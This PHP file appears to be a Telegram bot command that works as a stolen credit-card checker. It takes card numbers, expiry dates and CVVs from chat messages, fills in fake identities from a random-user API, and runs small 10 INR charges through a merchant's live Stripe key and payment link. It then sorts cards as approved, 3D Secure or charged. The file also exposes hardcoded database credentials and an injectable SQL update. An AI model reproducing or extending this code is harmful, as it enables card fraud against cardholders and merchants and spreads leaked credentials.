<?php
if(strpos($message, '!inr') === 0 or strpos($message, '/inr') === 0 or strpos($message, '.inr') === 0){
sendaction($chatId, typing);
if($gId != '1317173146'){
exit();}
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/for_plink');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'referer: https://checkout.stripe.com/';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key=pk_live_51JLPSHSID0RhUXxPkT0XkNS3XXcp7V0I1OAFlj97Y46IFdageQOa1B7d3hcosvhiQIbdwsNOv3LdJWTQy9smv5Ck00OSBwLRMU&payment_link=plink_1JQNuESID0RhUXxPzV9MYWSP&browser_init[browser_locale]=en-IN');
$get = curl_exec($ch);

// $cap1 = json_decode($get, 1);
//MERCHANT ID
$merchant = trim(strip_tags(getStr($get, 'session_id": "','"')));
sendMessage1($merchant);
echo "bearer: $merchant <br>";


#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'referer: https://checkout.stripe.com/';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$first.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][postal_code]='.$zip.'&key=pk_live_51JLPSHSID0RhUXxPkT0XkNS3XXcp7V0I1OAFlj97Y46IFdageQOa1B7d3hcosvhiQIbdwsNOv3LdJWTQy9smv5Ck00OSBwLRMU&payment_user_agent=stripe.js%2F3a9b59c33%3B+stripe-js-v3%2F3a9b59c33%3B+payment-link%3B+checkout');
$get = curl_exec($ch);
//MERCHANT ID
$id = trim(strip_tags(getStr($get, '"id": "','"')));
sendMessage1($id);
echo "bearer: $get <br>";


#------[CURL-2]------#
#------[CURL-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$merchant.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'referer: https://checkout.stripe.com/';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount=1000&expected_payment_method_type=card&key=pk_live_51JLPSHSID0RhUXxPkT0XkNS3XXcp7V0I1OAFlj97Y46IFdageQOa1B7d3hcosvhiQIbdwsNOv3LdJWTQy9smv5Ck00OSBwLRMU');
$get = curl_exec($ch);
sendMessage1($get);
$result = curl_exec($ch);
    $cap1 = json_decode($result, true);
    $ccc = preg_replace('/_/', ' ', ucfirst($cap1["error"]['decline_code']));
    $code = preg_replace('/_/', ' ', ucfirst($cap1["error"]['code']));
    $res = $cap1["error"]['message'];
	sendMessage1($res);
    $cvc_check = trim(strip_tags(getStr($result,'"cvc_check":"','"')));
curl_close($ch);
if (strpos($result, 'state": "succeeded')){
  $status = 'succeeded✅';
  $cc_code = "Charged 10Inr";
  cvv($list);
}elseif (strpos($result, 'status": "succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged 10Inr";
  cvv($list);
}elseif (strpos($result, 'succeeded')) {
  $status = 'succeeded✅';
  $cc_code = "Charged 10Inr";
  cvv($list);
}elseif (strpos($result, 'requires_action')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'redirect_to_url')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'requires_payment_method')) {
  $status = 'Approved✅';
  $cc_code = "3D SECURE";
  cvv($list);
}elseif (strpos($result, 'payment_failed')) {
  $status = 'Falied❌';
  $cc_code = "Payment failed";
  cvv($list);
}elseif (strpos($result, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVC PASS';
  rest($list);
}elseif (strpos($result1, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  cvv($list);
}elseif (!strpos($result, 'error')){
  $status = 'succeeded✅';
  $cc_code = "Charged 10Inr";
  cvv($list);
}
if(empty($ccc) and !empty($res)){
    $ccc = 'Card declined';
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}if(!empty($code)){
    $code = $code;
}elseif(empty($code)){
    $code = 'none';
}
sendMessage1($cc_code);
if(empty($result) or empty($ccc) or empty($code) or empty($res)){
$result = urlencode("<b>
GATE --> STRIPE - CHARGE 10INR
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[$role]
Credit Left ->> ${balance}💰
Bot By --> <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();
$link = mysqli_connect("localhost", "roldexco_root", "z8yT4vaO08", "roldexco_demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}
$result = urlencode("<b>
GATE --><i> STRIPE - CHARGE 10INR</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Code ->> $code
Result ->> $status
Message ->> $cc_code
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Bot By --> <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
}
?>